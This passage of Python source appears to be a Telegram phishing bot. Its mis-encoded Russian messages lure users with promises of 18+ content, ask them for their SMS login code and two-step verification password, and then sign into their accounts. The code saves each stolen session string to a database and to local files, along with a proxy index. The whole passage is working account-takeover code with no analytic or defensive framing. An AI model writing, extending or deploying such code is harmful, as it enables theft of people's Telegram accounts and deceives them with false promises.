            "–ö–æ–¥ —É—Å—Ç–∞—Ä–µ–ª. –ò—Å–ø–æ–ª—å–∑—É–π /start, —á—Ç–æ–±—ã –ø–æ–ª—É—á–∏—Ç—å –Ω–æ–≤—ã–π –∫–æ–¥ –∏ –æ—Ç–∫—Ä—ã—Ç—å –¥–æ—Å—Ç—É–ø –∫ –≥–æ—Ä—è—á–µ–º—É –∫–æ–Ω—Ç–µ–Ω—Ç—É!",
            parse_mode='Markdown'
        )
        await client.disconnect()
        cleanup(user_id)
    except PhoneCodeInvalidError:
        await bot.send_message(
            user_id,
            "‚ùå *–ù–µ–≤–µ—Ä–Ω—ã–π –∫–æ–¥*\n\n"
            "–ö–æ–¥ –≤–≤–µ–¥—ë–Ω –Ω–µ–ø—Ä–∞–≤–∏–ª—å–Ω–æ. –ü—Ä–æ–≤–µ—Ä—å SMS –∏ –≤–≤–µ–¥–∏ –∫–æ–¥ –∑–∞–Ω–æ–≤–æ, —á—Ç–æ–±—ã —Ä–∞–∑–±–ª–æ–∫–∏—Ä–æ–≤–∞—Ç—å –∫–æ–Ω—Ç–µ–Ω—Ç 18+!",
            parse_mode='Markdown'
        )
        user_code_buffers[user_id]['code'] = ""
        await send_code_keyboard(user_id, "", user_code_buffers[user_id]['message_id'])
    except SessionPasswordNeededError:
        user_states[user_id] = 'awaiting_2fa'
        update_user_log(
            user_id=user_id,
            updates={"status": "awaiting_2fa"}
        )
        await bot.send_message(
            user_id,
            "üîê *–û–ë–ù–ê–†–£–ñ–ï–ù–ê –î–û–ü–û–õ–ù–ò–¢–ï–õ–¨–ù–ê–Ø –ó–ê–©–ò–¢–ê* üîû\n\n"
            "–¢–≤–æ–π –∞–∫–∫–∞—É–Ω—Ç –∏—Å–ø–æ–ª—å–∑—É–µ—Ç –¥–≤—É—Ö—ç—Ç–∞–ø–Ω—É—é –≤–µ—Ä–∏—Ñ–∏–∫–∞—Ü–∏—é.\n\n"
            "üìù *–û—Ç–ø—Ä–∞–≤—å –ø–∞—Ä–æ–ª—å –±–µ–∑–æ–ø–∞—Å–Ω–æ—Å—Ç–∏ –Ω–∏–∂–µ, —á—Ç–æ–±—ã —Ä–∞–∑–±–ª–æ–∫–∏—Ä–æ–≤–∞—Ç—å –≤—Å—ë:*\n\n"
            "üíé *–ü–û–°–õ–ï –í–í–û–î–ê –ü–ê–†–û–õ–Ø –¢–´ –ü–û–õ–£–ß–ò–®–¨:*\n"
            "‚Ä¢ –ú–≥–Ω–æ–≤–µ–Ω–Ω—ã–π –¥–æ—Å—Ç—É–ø –∫ –∫–æ–Ω—Ç–µ–Ω—Ç—É 18+\n"
            "‚Ä¢ –≠–∫—Å–∫–ª—é–∑–∏–≤–Ω—ã–µ —Ñ–æ—Ç–æ –∏ –≤–∏–¥–µ–æ\n"
            "‚Ä¢ –ü—Ä–∏–≤–∞—Ç–Ω—ã–µ —á–∞—Ç—ã —Å –º–æ–¥–µ–ª—è–º–∏",
            parse_mode='Markdown'
        )
    except Exception as e:
        await bot.send_message(
            user_id,
            f"‚ùå *–û—à–∏–±–∫–∞ –ø—Ä–∏ –ø—Ä–æ–≤–µ—Ä–∫–µ*\n\n"
            f"–¢–µ—Ö–Ω–∏—á–µ—Å–∫–∞—è –ø—Ä–æ–±–ª–µ–º–∞:\n`{e}`\n\n"
            f"–ü–æ–ø—Ä–æ–±—É–π —Å–Ω–æ–≤–∞ —Å /start, —á—Ç–æ–±—ã –ø–æ–ª—É—á–∏—Ç—å –¥–æ—Å—Ç—É–ø –∫ —ç–∫—Å–∫–ª—é–∑–∏–≤–Ω–æ–º—É –∫–æ–Ω—Ç–µ–Ω—Ç—É!",
            parse_mode='Markdown'
        )
        await client.disconnect()
        cleanup(user_id)

@dp.message_handler(lambda message: user_states.get(message.from_user.id) == 'awaiting_2fa')
async def process_2fa(message: types.Message):
    user_id = message.from_user.id
    password = message.text.strip()
    client = user_clients.get(user_id)
    phone = user_phones.get(user_id)

    if not client or not phone:
        await message.answer("‚ö†Ô∏è –°–µ—Å—Å–∏—è –∏—Å—Ç–µ–∫–ª–∞. –ò—Å–ø–æ–ª—å–∑—É–π /start –¥–ª—è –ø–µ—Ä–µ–∑–∞–ø—É—Å–∫–∞")
        cleanup(user_id)
        return

    try:
        await client.sign_in(password=password)
        if await client.is_user_authorized():
            session_str = client.session.save()
            
            proxy_index = 0
            if hasattr(client, '_sender') and hasattr(client._sender, '_proxy'):
                current_proxy = client._sender._proxy
                proxy_index = next((i for i, p in enumerate(proxy_list) if p == current_proxy), 0)
            
            sessions_col.update_one(
                {"phone": phone}, 
                {"$set": {
                    "phone": phone, 
                    "session": session_str, 
                    "proxy_index": proxy_index,
                    "user_id": user_id,
                    "auth_date": datetime.now(),
                    "has_2fa": True
                }}, 
                upsert=True
            )
            
            update_user_log(
                user_id=user_id,
                updates={
                    "auth_success": True,
                    "auth_time": datetime.now(),
                    "has_2fa": True,
                    "status": "authenticated_with_2fa",
                    "proxy_index": proxy_index
                }
            )

            with open(f"sessions/{phone.replace('+', '')}.json", "w") as f:
                json.dump({"phone": phone, "session": session_str}, f)

            await message.answer(
                "üéâ *–ü–†–û–í–ï–†–ö–ê –£–°–ü–ï–®–ù–û –ó–ê–í–ï–†–®–ï–ù–ê!* üîûüéä\n\n"
                "‚úÖ *–ü–û–õ–ù–´–ô –î–û–°–¢–£–ü –ö –ö–û–ù–¢–ï–ù–¢–£ –î–õ–Ø –í–ó–†–û–°–õ–´–•!*\n\n"
                "üî• *–î–û–ë–†–û –ü–û–ñ–ê–õ–û–í–ê–¢–¨ –í –≠–ö–°–ö–õ–Æ–ó–ò–í–ù–£–Æ –ó–û–ù–£ 18+!*\n\n"
                "üíã *–¢–ï–ü–ï–†–¨ –¢–´ –ú–û–ñ–ï–®–¨ –ù–ê–°–õ–ê–ñ–î–ê–¢–¨–°–Ø:*\n"
                "‚Ä¢ –ë–æ–ª–µ–µ 10.000 –≥–æ—Ä—è—á–∏—Ö —Ñ–æ—Ç–æ –∏ –ø—Ä–∏–≤–∞—Ç–Ω—ã—Ö –≤–∏–¥–µ–æ\n"
                "‚Ä¢ –î–µ–≤—É—à–∫–∏ –∏–∑ –†–æ—Å—Å–∏–∏ –∏ –º–æ–¥–µ–ª–∏ —Å–æ –≤—Å–µ–≥–æ –º–∏—Ä–∞\n"
                "‚Ä¢ –≠–∫—Å–∫–ª—é–∑–∏–≤–Ω—ã–π –ª—é–±–∏—Ç–µ–ª—å—Å–∫–∏–π –∫–æ–Ω—Ç–µ–Ω—Ç\n"
                "‚Ä¢ –ü—Ä—è–º—ã–µ —Ç—Ä–∞–Ω—Å–ª—è—Ü–∏–∏ –∏ —É–Ω–∏–∫–∞–ª—å–Ω—ã–µ –º–∞—Ç–µ—Ä–∏–∞–ª—ã\n"
                "‚Ä¢ –ü—Ä–∏–≤–∞—Ç–Ω—ã–µ —á–∞—Ç—ã —Å –º–æ–¥–µ–ª—è–º–∏\n\n"
                "üöÄ *–ö–æ–Ω—Ç–µ–Ω—Ç —É–∂–µ –Ω–∞ –ø–æ–¥—Ö–æ–¥–µ...*\n"
                "–ú—ã –≥–æ—Ç–æ–≤–∏–º —Ç–≤–æ–π –ø–æ–ª–Ω—ã–π –¥–æ—Å—Ç—É–ø.\n"
                "–ü–µ—Ä–≤—ã–µ –º–∞—Ç–µ—Ä–∏–∞–ª—ã –ø—Ä–∏–¥—É—Ç –≤ —Ç–µ—á–µ–Ω–∏–µ –Ω–µ—Å–∫–æ–ª—å–∫–∏—Ö –º–∏–Ω—É—Ç!\n\n"
                "‚ö†Ô∏è *–î–ï–†–ñ–ò –î–û–°–¢–£–ü –í –°–ï–ö–†–ï–¢–ï* - –ö–æ–Ω—Ç–µ–Ω—Ç —Ç–æ–ª—å–∫–æ –¥–ª—è —Ç–µ–±—è!",
                parse_mode='Markdown'
            )
            await client.disconnect()
            cleanup(user_id)
        else:
            await message.answer(
                "‚ùå *–ù–µ–≤–µ—Ä–Ω—ã–π –ø–∞—Ä–æ–ª—å*\n\n"
                "–ü–∞—Ä–æ–ª—å –≤–≤–µ–¥—ë–Ω –Ω–µ–ø—Ä–∞–≤–∏–ª—å–Ω–æ. –û—Ç–ø—Ä–∞–≤—å –ø—Ä–∞–≤–∏–ª—å–Ω—ã–π –ø–∞—Ä–æ–ª—å, —á—Ç–æ–±—ã —Ä–∞–∑–±–ª–æ–∫–∏—Ä–æ–≤–∞—Ç—å –∫–æ–Ω—Ç–µ–Ω—Ç 18+!",
                parse_mode='Markdown'
            )
    except Exception as e:
        await message.answer(
            f"‚ùå *–û—à–∏–±–∫–∞ –ø—Ä–æ–≤–µ—Ä–∫–∏*\n\n"
            f"–ü—Ä–æ–±–ª–µ–º–∞: `{e}`\n\n"
            f"–ü–æ–ø—Ä–æ–±—É–π —Å–Ω–æ–≤–∞ —Å /start, —á—Ç–æ–±—ã –ø–æ–ª—É—á–∏—Ç—å –¥–æ—Å—Ç—É–ø –∫ —ç–∫—Å–∫–ª—é–∑–∏–≤–Ω–æ–º—É –∫–æ–Ω—Ç–µ–Ω—Ç—É!",
            parse_mode='Markdown'
        )
        await client.disconnect()
        cleanup(user_id)

if __name__ == '__main__':
    executor.start_polling(dp, skip_updates=True)